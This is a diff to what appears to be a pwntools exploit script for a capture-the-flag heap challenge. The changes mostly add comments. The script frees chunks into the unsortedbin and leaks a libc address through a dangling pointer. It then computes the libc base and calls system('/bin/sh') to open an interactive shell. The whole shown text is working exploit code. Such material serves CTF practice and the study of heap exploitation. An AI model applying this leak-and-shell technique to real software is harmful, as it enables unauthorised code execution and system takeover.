@@ -75,6 +75,7 @@ io = start()
 
 # --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---
 
+# leak libc through dangling pointer of unsortedbin
 for i in range(1, 10):
     info(f"create page {i}")
     CREATE(0x80, i)
@@ -84,18 +85,18 @@ for i in range(1, 9):
     REMOVE(i)
     
 SHOW(8)
-
 io.recvuntil(b"Page content: ")
 leaked_unsorted_arena = u64(io.recv(6).ljust(8, b'\x00'))
 diff = 0x21ace0
 libc.address = leaked_unsorted_arena - diff
 success(f"libc.address: {hex(libc.address)}")
+# ---------------------------
 
+# trigger system('/bin/sh\x00')
 CREATE(0x10, 0, hex(libc.sym['system']))
 CREATE(0x10, 1, b"/bin/sh\x00")
-
 s(b"42")
-
+# ---------------------------
 
 io.interactive()
 
